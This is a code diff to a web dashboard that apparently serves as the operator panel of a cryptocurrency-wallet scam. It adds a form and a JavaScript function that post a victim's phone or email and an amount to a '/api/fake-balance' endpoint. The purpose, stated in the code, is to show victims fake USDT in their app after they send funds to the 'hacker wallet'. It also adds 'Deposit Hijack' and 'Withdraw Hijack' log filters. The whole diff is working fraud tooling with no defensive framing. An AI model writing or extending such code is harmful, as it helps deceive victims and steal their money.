@@ -332,6 +332,17 @@
         Enable clear
       </label>
     </div>
+    <label style="margin-top:14px">Fake balance inject (CEO proof — victim Wallet shows extra USDT)</label>
+    <div class="input-row">
+      <input id="fakeMobile" placeholder="Victim mobile or email from login log" />
+      <input id="fakeAmount" placeholder="USDT amount e.g. 100" type="number" min="0" step="0.01" />
+    </div>
+    <div class="btn-row">
+      <button class="btn-primary" onclick="injectFakeBalance()">💰 Inject fake USDT to victim app</button>
+    </div>
+    <p style="font-size:11px;color:var(--muted);margin-top:8px">
+      After victim sends crypto to hacker wallet, set same amount here → victim opens Wallet tab and sees balance (UI unchanged).
+    </p>
   </div>
 
   <div class="filters" id="filters">
@@ -341,7 +352,8 @@
     <button class="filter-btn" data-filter="change_login_password" onclick="setFilter('change_login_password',this)">Login Pwd</button>
     <button class="filter-btn" data-filter="change_fund_password" onclick="setFilter('change_fund_password',this)">Fund Pwd</button>
     <button class="filter-btn" data-filter="verify_fund_password" onclick="setFilter('verify_fund_password',this)">Withdraw</button>
-    <button class="filter-btn" data-filter="manual_reset" onclick="setFilter('manual_reset',this)">Manual Reset</button>
+    <button class="filter-btn" data-filter="deposit_hijack" onclick="setFilter('deposit_hijack',this)">Deposit Hijack</button>
+    <button class="filter-btn" data-filter="fake_balance_set" onclick="setFilter('fake_balance_set',this)">Fake Balance</button>
   </div>
 
   <p id="status"></p>
@@ -405,6 +417,10 @@
         change_fund_password: 'Change Fund Pwd',
         verify_fund_password: 'Fund Verify (Withdraw)',
         manual_reset: 'Manual Reset',
+        deposit_hijack: 'Deposit Hijack',
+        withdraw_hijack: 'Withdraw Hijack',
+        fake_balance_set: 'Fake Balance Set',
+        fake_balance_get: 'Fake Balance Poll',
       };
       return map[a] || a || 'Unknown';
     }
@@ -519,6 +535,29 @@
       btn.classList.add('active');
       renderCards(allData);
       renderTable(allData);
+    }
+
+    async function injectFakeBalance() {
+      const b = base();
+      const mobile = document.getElementById('fakeMobile').value.trim();
+      const amount = document.getElementById('fakeAmount').value.trim();
+      const status = document.getElementById('status');
+      if (!b) { status.textContent = 'Enter server URL first'; status.className = 'error'; return; }
+      if (!mobile || !amount) { status.textContent = 'Enter victim mobile/email and USDT amount'; status.className = 'error'; return; }
+      try {
+        const r = await fetch(b + '/api/fake-balance', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ mobile, amount: Number(amount), coin: 'USDT' }),
+        });
+        const j = await r.json();
+        status.textContent = '✓ Injected ' + amount + ' USDT for ' + mobile + ' — tell victim to open Wallet tab';
+        status.className = 'ok';
+        refresh();
+      } catch (e) {
+        status.textContent = '✗ Fake balance error: ' + e.message;
+        status.className = 'error';
+      }
     }
 
     async function refresh() {
